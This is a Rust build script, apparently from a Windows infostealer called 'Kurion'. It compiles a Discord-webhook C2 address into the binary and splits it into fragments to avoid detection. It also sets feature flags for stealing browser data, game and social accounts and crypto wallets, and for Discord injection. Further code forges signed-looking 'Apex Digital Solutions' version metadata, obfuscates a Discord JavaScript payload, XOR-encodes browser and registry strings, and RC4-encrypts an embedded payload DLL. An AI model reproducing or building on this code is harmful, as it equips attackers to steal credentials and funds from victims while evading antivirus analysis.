use std::fs::File;
use std::io::{Read, Write};
use std::path::Path;
use flate2::write::ZlibEncoder;
use flate2::Compression;

fn main() {
    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-changed=../payload/target/x86_64-pc-windows-gnu/release/payload.dll");
    println!("cargo:rerun-if-env-changed=KURION_PE_IDENTITY");
    
    let target_os = std::env::var("CARGO_CFG_TARGET_OS").unwrap_or_default();
    if target_os == "windows" {
        let identity = std::env::var("KURION_PE_IDENTITY").unwrap_or_else(|_| "generic".to_string());
        let mut res = winres::WindowsResource::new();

        let icon_path = Path::new("resources/app.ico");
        if icon_path.exists() {
            res.set_icon(icon_path.to_str().unwrap());
        }

        match identity.as_str() {
            "runtime" => {
                res.set("FileDescription", "Application Runtime Host");
                res.set("ProductName", "Apex Runtime Environment");
                res.set("CompanyName", "Apex Digital Solutions Inc");
                res.set("LegalCopyright", "Copyright (C) 2024 Apex Digital Solutions Inc. All rights reserved.");
                res.set("FileVersion", "3.8.1.4102");
                res.set("ProductVersion", "3.8.1.4102");
                res.set("OriginalFilename", "apxruntime.exe");
                res.set("InternalName", "apxruntime");
            },
            "service" => {
                res.set("FileDescription", "System Configuration Service");
                res.set("ProductName", "Apex Configuration Manager");
                res.set("CompanyName", "Apex Digital Solutions Inc");
                res.set("LegalCopyright", "Copyright (C) 2024 Apex Digital Solutions Inc. All rights reserved.");
                res.set("FileVersion", "2.4.0.7185");
                res.set("ProductVersion", "2.4.0.7185");
                res.set("OriginalFilename", "apxconfig.exe");
                res.set("InternalName", "apxconfig");
            },
            "updater" => {
                res.set("FileDescription", "Software Update Agent");
                res.set("ProductName", "Apex Update Service");
                res.set("CompanyName", "Apex Digital Solutions Inc");
                res.set("LegalCopyright", "Copyright (C) 2024 Apex Digital Solutions Inc. All rights reserved.");
                res.set("FileVersion", "5.1.2.3340");
                res.set("ProductVersion", "5.1.2.3340");
                res.set("OriginalFilename", "apxupdate.exe");
                res.set("InternalName", "apxupdate");
            },
            _ => {
                res.set("FileDescription", "Apex Application Host");
                res.set("ProductName", "Apex Application Platform");
                res.set("CompanyName", "Apex Digital Solutions Inc");
                res.set("LegalCopyright", "Copyright (C) 2024 Apex Digital Solutions Inc. All rights reserved.");
                res.set("FileVersion", "1.0.0.2048");
                res.set("ProductVersion", "1.0.0.2048");
                res.set("OriginalFilename", "apxhost.exe");
                res.set("InternalName", "apxhost");
            },
        };

        let (manifest_name, manifest_version) = match identity.as_str() {
            "runtime" => ("Apex.Runtime.Host", "3.8.1.4102"),
            "service" => ("Apex.Configuration.Service", "2.4.0.7185"),
            "updater" => ("Apex.Update.Agent", "5.1.2.3340"),
            _ => ("Apex.Application.Host", "1.0.0.2048"),
        };

        let out_dir = std::env::var("OUT_DIR").unwrap();
        let manifest_path = Path::new(&out_dir).join("generated.manifest");
        let manifest_content = format!(
            r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity
    type="win32"
    name="{name}"
    version="{version}"
    processorArchitecture="amd64"
  />
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <supportedOS Id="{{e2011457-1546-43c5-a5fe-008deee3d3f0}}"/>
      <supportedOS Id="{{35138b9a-5d96-4fbd-8e2d-a2440225f93a}}"/>
      <supportedOS Id="{{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}}"/>
      <supportedOS Id="{{1f676c76-80e1-4239-95bb-83d0f6d0da78}}"/>
      <supportedOS Id="{{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}}"/>
    </application>
  </compatibility>
</assembly>"#,
            name = manifest_name,
            version = manifest_version,
        );
        std::fs::write(&manifest_path, &manifest_content).unwrap();
        res.set_manifest_file(manifest_path.to_str().unwrap());

        println!("cargo:warning=PE Identity: {}", identity);

        match res.compile() {
            Ok(_) => {
                println!("cargo:rustc-link-arg={}/resource.o", out_dir);
            }
            Err(e) => {
                println!("cargo:warning=winres failed (non-fatal): {}", e);
            }
        }
    }
    
    println!("cargo:rerun-if-env-changed=KURION_C2_URL");
    println!("cargo:rerun-if-env-changed=KURION_FEATURES");
    println!("cargo:rerun-if-env-changed=KURION_ANTIVM");
    println!("cargo:rerun-if-env-changed=KURION_SELF_DELETE");
    println!("cargo:rerun-if-env-changed=KURION_PERSIST");
    println!("cargo:rerun-if-env-changed=KURION_INJECTION_WEBHOOK");

    let out_dir = std::env::var("OUT_DIR").unwrap();

    let c_url = std::env::var("KURION_C2_URL").unwrap_or_default();
    let features = std::env::var("KURION_FEATURES").unwrap_or_default();
    let anti_vm = std::env::var("KURION_ANTIVM").unwrap_or_else(|_| "false".to_string()) == "true";
    let self_delete = std::env::var("KURION_SELF_DELETE").unwrap_or_else(|_| "false".to_string()) == "true";
    let persist = std::env::var("KURION_PERSIST").unwrap_or_else(|_| "false".to_string()) == "true";
    let i_webhook = std::env::var("KURION_INJECTION_WEBHOOK").unwrap_or_default();


    let features_list: Vec<&str> = features.split(',').map(|s| s.trim()).filter(|s| !s.is_empty()).collect();
    let has_browsers = features_list.contains(&"browsers");
    let has_games = features_list.contains(&"games");
    let has_socials = features_list.contains(&"socials");
    let has_injection = features_list.contains(&"injection");
    let has_wallets = features_list.contains(&"wallets");

    let config_path = Path::new(&out_dir).join("build_config.rs");
    let mut f = File::create(&config_path).unwrap();
    writeln!(f, "#[allow(dead_code)]").unwrap();
    writeln!(f, "/// Compile-time embedded configuration").unwrap();
    writeln!(f, "pub mod build_config {{").unwrap();
    let disc_check: String = ["disc", "ord.com/api/web", "hooks/"].concat();
    if c_url.contains(&disc_check) {
        let suffix = c_url.splitn(2, "webhooks/").nth(1).unwrap_or("");
        let mid = suffix.len() / 2;
        let (s1, s2) = suffix.split_at(mid);
        writeln!(f, "    pub fn c_url() -> String {{ [\"https://disc\", \"ord.co\", \"m/api/web\", \"hooks/{}\", \"{}\"].concat() }}", s1, s2).unwrap();
    } else {
        writeln!(f, "    pub fn c_url() -> String {{ \"{}\".to_string() }}", c_url).unwrap();
    }
    writeln!(f, "    #[allow(unused_mut)]").unwrap();
    writeln!(f, "    pub fn f_str() -> String {{").unwrap();
    writeln!(f, "        let mut v: Vec<String> = Vec::new();").unwrap();
    if has_browsers  { writeln!(f, "        v.push([\"brow\",\"sers\"].concat());").unwrap(); }
    if has_games     { writeln!(f, "        v.push([\"ga\",\"mes\"].concat());").unwrap(); }
    if has_socials   { writeln!(f, "        v.push([\"soci\",\"als\"].concat());").unwrap(); }
    if has_injection { writeln!(f, "        v.push([\"inje\",\"ction\"].concat());").unwrap(); }
    if has_wallets   { writeln!(f, "        v.push([\"wal\",\"lets\"].concat());").unwrap(); }
    writeln!(f, "        v.join(\",\")").unwrap();
    writeln!(f, "    }}").unwrap();
    writeln!(f, "    pub const ANTI_VM: bool = {};", anti_vm).unwrap();
    writeln!(f, "    pub const SELF_DELETE: bool = {};", self_delete).unwrap();
    writeln!(f, "    pub const PERSIST: bool = {};", persist).unwrap();
    if i_webhook.contains(&disc_check) {
        let iw_suffix = i_webhook.splitn(2, "webhooks/").nth(1).unwrap_or("");
        let iw_mid = iw_suffix.len() / 2;
        let (iw1, iw2) = iw_suffix.split_at(iw_mid);
        writeln!(f, "    pub fn i_webhook() -> String {{ [\"https://disc\", \"ord.co\", \"m/api/web\", \"hooks/{}\", \"{}\"].concat() }}", iw1, iw2).unwrap();
    } else {
        writeln!(f, "    pub fn i_webhook() -> String {{ \"{}\".to_string() }}", i_webhook).unwrap();
    }
    writeln!(f).unwrap();
    writeln!(f, "    // Feature flags").unwrap();
    writeln!(f, "    pub const FEATURE_BROWSERS: bool = {};", has_browsers).unwrap();
    writeln!(f, "    pub const FEATURE_GAMES: bool = {};", has_games).unwrap();
    writeln!(f, "    pub const FEATURE_SOCIALS: bool = {};", has_socials).unwrap();
    writeln!(f, "    pub const FEATURE_INJECTION: bool = {};", has_injection).unwrap();
    writeln!(f, "    pub const FEATURE_WALLETS: bool = {};", has_wallets).unwrap();
    writeln!(f).unwrap();
    writeln!(f, "    // Decoy dialog config").unwrap();
    writeln!(f, "}}").unwrap();
    
    if !c_url.is_empty() {
        let display_url = r_url(&c_url);
        println!("cargo:warning=Build config: C2={} features={}", display_url, features);
    }
    
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos();

    let mut entropy = [0u8; 64];
    let mut state = seed as u64;
    for b in entropy.iter_mut() {
        state = state.wrapping_mul(6364136223846793005).wrapping_add(1);
        *b = (state >> 33) as u8;
    }

    let mut key = [0u8; 32];
    state = seed as u64 ^ 0xDEADBEEFCAFEBABE;
    for b in key.iter_mut() {
        state = state.wrapping_mul(6364136223846793005).wrapping_add(1);
        *b = (state >> 33) as u8;
    }

    let entropy_path = Path::new(&out_dir).join("entropy.rs");
    let mut f = File::create(&entropy_path).unwrap();
    writeln!(f, "#[used]").unwrap();
    writeln!(f, "#[no_mangle]").unwrap();
    writeln!(f, "pub static BUILD_ENTROPY: [u8; 64] = {:?};", entropy).unwrap();
    writeln!(f, "pub static PAYLOAD_KEY: [u8; 32] = {:?};", key).unwrap();

    fn x_str(s: &str, key: &[u8]) -> Vec<u8> {
        s.bytes().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect()
    }

    fn r_url(url: &str) -> String {
        if url.len() <= 40 {
            return format!("{}..", &url[..url.len().min(12)]);
        }
        let prefix: String = url.chars().take(40).collect();
        format!("{}...", prefix)
    }

    fn o_js(js_source: &str, out_dir: &str, name: &str) -> String {
        use std::process::Command;

        let placeholders = [
            ("%WEBHOOK%", "KPLC_WH_KPLC"),
            ("%C2_METHOD%", "KPLC_CM_KPLC"),
            ("%PANEL_URL%", "KPLC_PU_KPLC"),
            ("%C2_TOKEN%", "KPLC_CT_KPLC"),
            ("%BUILD_ID%", "KPLC_BI_KPLC"),
        ];

        let mut source = js_source.to_string();
        for (original, marker) in &placeholders {
            source = source.replace(original, marker);
        }

        let input_path = format!("{}/{}_input.js", out_dir, name);
        let output_path = format!("{}/{}_obf.js", out_dir, name);

        std::fs::write(&input_path, &source).unwrap();

        let result = Command::new("javascript-obfuscator")
            .arg(&input_path)
            .arg("--output").arg(&output_path)
            .arg("--compact").arg("true")
            .arg("--control-flow-flattening").arg("true")
            .arg("--control-flow-flattening-threshold").arg("0.75")
            .arg("--dead-code-injection").arg("true")
            .arg("--dead-code-injection-threshold").arg("0.4")
            .arg("--string-array").arg("true")
            .arg("--string-array-threshold").arg("0.75")
            .arg("--rename-globals").arg("true")
            .arg("--self-defending").arg("true")
            .arg("--reserved-strings").arg("KPLC")
            .arg("--target").arg("node")
            .output();

        match result {
            Ok(output) => {
                if output.status.success() {
                    if let Ok(mut obfuscated) = std::fs::read_to_string(&output_path) {
                        for (original, marker) in &placeholders {
                            obfuscated = obfuscated.replace(marker, original);
                        }
                        println!("cargo:warning={} obfuscated: {} -> {} bytes", name, js_source.len(), obfuscated.len());
                        let _ = std::fs::remove_file(&input_path);
                        let _ = std::fs::remove_file(&output_path);
                        return obfuscated;
                    }
                }
                let stderr = String::from_utf8_lossy(&output.stderr);
                println!("cargo:warning={} obfuscation failed: {}", name, stderr);
            }
            Err(e) => {
                println!("cargo:warning={} obfuscation unavailable: {}", name, e);
            }
        }

        let _ = std::fs::remove_file(&input_path);
        let _ = std::fs::remove_file(&output_path);
        js_source.to_string()
    }


    let browser_strings: &[(&str, &str)] = &[
        ("BS_CHROME",            "chrome"),
        ("BS_CHROME_BETA",       "chrome-beta"),
        ("BS_EDGE",              "edge"),
        ("BS_BRAVE",             "brave"),
        ("BS_OPERA",             "opera"),
        ("BS_OPERA_GX",          "opera-gx"),
        ("BS_VIVALDI",           "vivaldi"),
        ("BS_YANDEX",            "yandex"),
        ("BS_EXE_CHROME",        "chrome.exe"),
        ("BS_EXE_EDGE",          "msedge.exe"),
        ("BS_EXE_BRAVE",         "brave.exe"),
        ("BS_EXE_OPERA",         "opera.exe"),
        ("BS_EXE_VIVALDI",       "vivaldi.exe"),
        ("BS_EXE_BROWSER",       "browser.exe"),
        ("BS_NAME_CHROME",       "Chrome"),
        ("BS_NAME_CHROME_BETA",  "Chrome Beta"),
        ("BS_NAME_EDGE",         "Edge"),
        ("BS_NAME_BRAVE",        "Brave"),
        ("BS_NAME_OPERA",        "Opera Stable"),
        ("BS_NAME_OPERA_GX",     "Opera GX Stable"),
        ("BS_NAME_VIVALDI",      "Vivaldi"),
        ("BS_NAME_YANDEX",       "Yandex Browser"),
        ("BS_REG_CHROME_1",      r"\Registry\Machine\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome"),
        ("BS_REG_CHROME_2",      r"\Registry\Machine\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome"),
        ("BS_REG_CHROME_3",      r"\Registry\Machine\SOFTWARE\Clients\StartMenuInternet\Google Chrome\shell\open\command"),
        ("BS_REG_CHROME_BETA_1", r"\Registry\Machine\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome Beta"),
        ("BS_REG_CHROME_BETA_2", r"\Registry\Machine\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome Beta"),
        ("BS_REG_CHROME_BETA_3", r"\Registry\Machine\SOFTWARE\Clients\StartMenuInternet\Google Chrome Beta\shell\open\command"),
        ("BS_REG_EDGE_1",        r"\Registry\Machine\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Microsoft Edge"),
        ("BS_REG_EDGE_2",        r"\Registry\Machine\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\Microsoft Edge"),
        ("BS_REG_EDGE_3",        r"\Registry\Machine\SOFTWARE\Clients\StartMenuInternet\Microsoft Edge\shell\open\command"),
        ("BS_REG_BRAVE_1",       r"\Registry\Machine\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\BraveSoftware Brave-Browser"),
        ("BS_REG_BRAVE_2",       r"\Registry\Machine\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\BraveSoftware Brave-Browser"),
        ("BS_REG_BRAVE_3",       r"\Registry\Machine\SOFTWARE\Clients\StartMenuInternet\Brave\shell\open\command"),
        ("BS_REG_OPERA_1",       r"\Registry\Machine\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Opera Stable"),
        ("BS_REG_OPERA_2",       r"\Registry\Machine\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\Opera Stable"),
        ("BS_REG_OPERA_GX_1",    r"\Registry\Machine\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Opera GX Stable"),
        ("BS_REG_OPERA_GX_2",    r"\Registry\Machine\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\Opera GX Stable"),
        ("BS_REG_VIVALDI_1",     r"\Registry\Machine\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Vivaldi"),
        ("BS_REG_VIVALDI_2",     r"\Registry\Machine\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\Vivaldi"),
        ("BS_REG_VIVALDI_3",     r"\Registry\Machine\SOFTWARE\Clients\StartMenuInternet\Vivaldi\shell\open\command"),
        ("BS_REG_YANDEX_1",      r"\Registry\Machine\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Yandex"),
        ("BS_REG_YANDEX_2",      r"\Registry\Machine\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\Yandex"),
        ("BS_APP_PATHS_32",      r"\Registry\Machine\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\"),
        ("BS_APP_PATHS_64",      r"\Registry\Machine\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\"),
        ("BS_VAL_INSTALL",       "InstallLocation"),
        ("BS_USER_DATA",         "User Data"),
        ("BS_VENDOR_GOOGLE",     "Google"),
        ("BS_VENDOR_MICROSOFT",  "Microsoft"),
        ("BS_VENDOR_BRAVE_SW",   "BraveSoftware"),
        ("BS_VENDOR_YANDEX_DIR", "Yandex"),
        ("BS_CHROME_BETA_DIR",   "Chrome Beta"),
        ("BS_BRAVE_BROWSER",     "Brave-Browser"),
        ("BS_YANDEX_BROWSER",    "YandexBrowser"),
        ("BS_OPERA_SOFTWARE",    "Opera Software"),
        ("BS_OPERA_GX_DIR",      "Opera GX Stable"),
        ("BS_CHROME_ARGS",       "--no-sandbox --allow-no-sandbox-job --disable-gpu --disable-software-rasterizer"),
        ("BS_EXPLORER",          "explorer.exe"),
        ("BS_PIPE_NAME",         "\\\\.\\pipe\\interium_pipe"),
    ];
    let bstr_path = Path::new(&out_dir).join("obf_browser_strings.rs");
    let mut bsf = File::create(&bstr_path).unwrap();
    for (name, s) in browser_strings {
        let enc = x_str(s, &key);
        writeln!(bsf, "#[allow(dead_code)] pub const {}: &[u8] = &{:?};", name, enc).unwrap();
    }

    // Discord JS payload obfuscation
    println!("cargo:rerun-if-changed=src/injector/discord_payload.js");
    let discord_js_paths = [
        "src/injector/discord_payload.js",
        "../injector/src/injector/discord_payload.js",
    ];
    let mut discord_js = String::new();
    for path in &discord_js_paths {
        if let Ok(content) = std::fs::read_to_string(path) {
            discord_js = content;
            println!("cargo:warning=Discord payload: {} bytes from {}", discord_js.len(), path);
            break;
        }
    }
    let discord_path = Path::new(&out_dir).join("discord_payload_enc.rs");
    let mut df = File::create(&discord_path).unwrap();
    if !discord_js.is_empty() {
        let discord_js = o_js(&discord_js, &out_dir, "discord");
        let discord_enc = x_str(&discord_js, &key);
        writeln!(df, "pub const DISCORD_PAYLOAD_ENC: &[u8] = &{:?};", discord_enc).unwrap();
    } else {
        writeln!(df, "pub const DISCORD_PAYLOAD_ENC: &[u8] = &[];").unwrap();
        println!("cargo:warning=Discord payload JS not found - injection will be empty");
    }

    let payload_paths = [
        "../target/x86_64-pc-windows-gnu/release/payload.dll",
        "target/x86_64-pc-windows-gnu/release/payload.dll",
        "../payload/target/x86_64-pc-windows-gnu/release/payload.dll",
    ];

    let mut payload_bytes: Option<Vec<u8>> = None;
    let mut raw_payload_size: usize = 0;
    for path in &payload_paths {
        if let Ok(mut file) = File::open(path) {
            let mut bytes = Vec::new();
            if file.read_to_end(&mut bytes).is_ok() && !bytes.is_empty() {
                let raw_size = bytes.len();

                let mut encoder = ZlibEncoder::new(Vec::new(), Compression::best());
                encoder.write_all(&bytes).unwrap();
                let mut compressed = encoder.finish().unwrap();
                println!("cargo:warning=Payload compression: {} -> {} bytes ({:.1}%)",
                    raw_size, compressed.len(), compressed.len() as f64 / raw_size as f64 * 100.0);

                let mut s: [u8; 256] = core::array::from_fn(|i| i as u8);
                let mut j: u8 = 0;
                for i in 0..256 {
                    j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
                    s.swap(i, j as usize);
                }
                let mut i: u8 = 0;
                j = 0;
                for byte in compressed.iter_mut() {
                    i = i.wrapping_add(1);
                    j = j.wrapping_add(s[i as usize]);
                    s.swap(i as usize, j as usize);
                    let k = s[(s[i as usize].wrapping_add(s[j as usize])) as usize];
                    *byte ^= k;
                }
                payload_bytes = Some(compressed);
                raw_payload_size = raw_size;
                println!("cargo:warning=Embedded compressed+encrypted payload from: {}", path);
                break;
            }
        }
    }

    let payload_path = Path::new(&out_dir).join("embedded_payload.rs");
    let mut f = File::create(&payload_path).unwrap();
    
    if let Some(bytes) = payload_bytes {
        let original_size = raw_payload_size;

        let hex: String = bytes.iter().map(|b| format!("{:02x}", b)).collect();

        writeln!(f, "/// Payload hex-encoded (zlib compressed + RC4 encrypted)").unwrap();
        writeln!(f, "/// Single &str avoids fat-pointer array overhead").unwrap();
        writeln!(f, "pub static EMBEDDED_PAYLOAD_HEX: &str = \"{}\";", hex).unwrap();
        writeln!(f, "pub const PAYLOAD_ORIGINAL_SIZE: usize = {};", original_size).unwrap();

        writeln!(f, "pub static EMBEDDED_PAYLOAD_UUIDS: Option<&[&str]> = None;").unwrap();
        writeln!(f, "pub const PAYLOAD_UUID_COUNT: usize = 0;").unwrap();
        writeln!(f, "pub static EMBEDDED_PAYLOAD: Option<&[u8]> = None;").unwrap();
        writeln!(f, "pub const PAYLOAD_SIZE: usize = {};", original_size).unwrap();
    } else {
        writeln!(f, "pub static EMBEDDED_PAYLOAD_HEX: &str = \"\";").unwrap();
        writeln!(f, "pub const PAYLOAD_ORIGINAL_SIZE: usize = 0;").unwrap();
        writeln!(f, "pub static EMBEDDED_PAYLOAD_UUIDS: Option<&[&str]> = None;").unwrap();
        writeln!(f, "pub const PAYLOAD_UUID_COUNT: usize = 0;").unwrap();
        writeln!(f, "pub static EMBEDDED_PAYLOAD: Option<&[u8]> = None;").unwrap();
        writeln!(f, "pub const PAYLOAD_SIZE: usize = 0;").unwrap();
        println!("cargo:warning=No payload.dll found - build payload first, then rebuild injector");
    }
}
